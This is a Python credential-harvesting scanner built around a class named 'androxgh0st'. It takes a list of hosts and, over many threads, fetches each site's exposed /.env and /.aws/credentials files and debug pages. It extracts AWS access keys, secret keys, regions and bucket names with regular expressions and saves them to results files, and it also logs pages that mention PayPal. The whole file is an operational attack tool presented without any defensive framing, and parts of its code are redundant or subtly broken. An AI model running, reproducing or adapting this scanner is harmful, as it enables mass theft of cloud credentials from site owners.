# -*- coding: utf-8 -*-
import requests
import os
import sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import Thread
from configparser import ConfigParser
from queue import Queue

try:
    os.mkdir('Results')
except FileExistsError:
    pass

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''
pid_restore = '.nero_swallowtail'

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class androxgh0st:
    def paypal(self, text, url):
        if "PAYPAL_" in text:
            save = open('Results/paypal_sandbox.txt', 'a')
            save.write(url + '\n')
            save.close()
            return True
        else:
            return False

    def get_aws_region(self, text):
        reg = False
        for region in list_region.splitlines():
            if str(region) in text:
                return region
                break

    def get_aws_data(self, text, url):
        try:
            if "AWS_ACCESS_KEY_ID" in text:
                if "AWS_ACCESS_KEY_ID=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nAWS ACCESS KEY: ' + str(aws_key) + '\nAWS SECRET KEY: ' + str(aws_sec) + '\nAWS REGION: ' + str(aws_reg) + '\nAWS BUCKET: '
                    remover = str(build).replace('\r', '')
                    save = open('Results/' + str(aws_reg)[:-2] + '.txt', 'a')
                    save.write(remover + '\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover + '\n\n')
                    save2.close()
                return True
            elif "AWS_KEY" in text:
                if "AWS_KEY=" in text:
                    method = '/.env'
                    try:
                        aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]
                    except:
                        aws_buc = ''
                elif "<td>AWS_KEY</td>" in text:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                        if asu:
                            aws_reg = asu
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_buc = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nAWS ACCESS KEY: ' + str(aws_key) + '\nAWS SECRET KEY: ' + str(aws_sec) + '\nAWS REGION: ' + str(aws_reg) + '\nAWS BUCKET: ' + str(aws_buc)
                    remover = str(build).replace('\r', '')
                    save = open('Results/' + str(aws_reg)[:-2] + '.txt', 'a')
                    save.write(remover + '\n\n')
                    save.close()
                    remover = str(build).replace('\r', '')
                    save2 = open('Results/aws_access_key_secret.txt', 'a')
                    save2.write(remover + '\n\n')
                    save2.close()
                return True
            else:
                return False
        except:
            return False

    def has_paypal_sandbox(self, url):
        try:
            if 'paypal.com' in url:
                return True
            elif 'sandbox.paypal.com' in url:
                return True
            elif 'api.sandbox.paypal.com' in url:
                return True
            else:
                return False
        except:
            return False

    def aws_worker(self, site):
        url = site
        site = 'http://' + site
        site2 = 'https://' + site
        try:
            try:
                response = requests.get(site2 + "/.env", timeout=5, verify=False, allow_redirects=False)
                text = response.content.decode('utf-8')
                aws = androxgh0st().get_aws_data(text, site2)
                if aws:
                    pass
                elif "AWS_" in text:
                    aws = androxgh0st().get_aws_data(text, site2)
                    if aws:
                        pass
            except:
                pass
            try:
                response = requests.get(site + "/.env", timeout=5, verify=False, allow_redirects=False)
                text = response.content.decode('utf-8')
                aws = androxgh0st().get_aws_data(text, site)
                if aws:
                    pass
                elif "AWS_" in text:
                    aws = androxgh0st().get_aws_data(text, site)
                    if aws:
                        pass
            except:
                pass
        except:
            pass
        try:
            try:
                response = requests.get(site2 + "/.aws/credentials", timeout=5, verify=False, allow_redirects=False)
                text = response.content.decode('utf-8')
                aws = androxgh0st().get_aws_data(text, site2)
                if aws:
                    pass
                elif "AWS_" in text:
                    aws = androxgh0st().get_aws_data(text, site2)
                    if aws:
                        pass
            except:
                pass
            try:
                response = requests.get(site + "/.aws/credentials", timeout=5, verify=False, allow_redirects=False)
                text = response.content.decode('utf-8')
                aws = androxgh0st().get_aws_data(text, site)
                if aws:
                    pass
                elif "AWS_" in text:
                    aws = androxgh0st().get_aws_data(text, site)
                    if aws:
                        pass
            except:
                pass
        except:
            pass

    def checkPayPal(self, url):
        if '://' not in url:
            url = 'http://' + url
        if androxgh0st().has_paypal_sandbox(url):
            text = requests.get(url, verify=False, allow_redirects=True).text
            if androxgh0st().paypal(text, url):
                print(url)

    def verifyPayPal(self, url):
        with open('results', 'r') as f:
            lines = f.readlines()
            if url + '\n' in lines:
                pass
            else:
                self.checkPayPal(url)

    def show_Results(self, keyword):
        try:
            with open('Results/' + keyword + '.txt', 'r') as f:
                print('**** ' + keyword + ' ****')
                while True:
                    line = f.readline()
                    if not line:
                        break
                    print(line, end='')
                print('**** ' + keyword + ' ****\n\n')
        except:
            pass

    def show_paypal_sandbox(self):
        try:
            with open('Results/paypal_sandbox.txt', 'r') as f:
                print('**** PayPal Sandbox ****')
                while True:
                    line = f.readline()
                    if not line:
                        break
                    print(line, end='')
                print('**** PayPal Sandbox ****\n\n')
        except:
            pass

    def show_AWS_KEY_secret(self):
        try:
            with open('Results/aws_access_key_secret.txt', 'r') as f:
                print('**** AWS Access Key and Secret Key ****')
                while True:
                    line = f.readline()
                    if not line:
                        break
                    print(line, end='')
                print('**** AWS Access Key and Secret Key ****\n\n')
        except:
            pass

def aws_worker(site):
    androxgh0st().aws_worker(site)

def get_args(cmd_args):
    if len(cmd_args) < 2:
        print("\nUsage: python3 " + cmd_args[0] + " <filename>")
        exit()

def main(filename):
    config = ConfigParser()
    config.read(filename)

    try:
        thread = config.getint('Settings', 'thread')
    except:
        thread = 1

    with open(filename, 'r') as f:
        lines = f.readlines()
        tasks = ThreadPool(thread)
        for line in lines:
            line = line.strip()
            tasks.add_task(aws_worker, line)

        tasks.wait_completion()
        print('\n')
    androxgh0st().show_Results('aws_access_key_secret')
    androxgh0st().show_paypal_sandbox()
    androxgh0st().show_AWS_KEY_secret()

if __name__ == "__main__":
    get_args(sys.argv)
    main(sys.argv[1])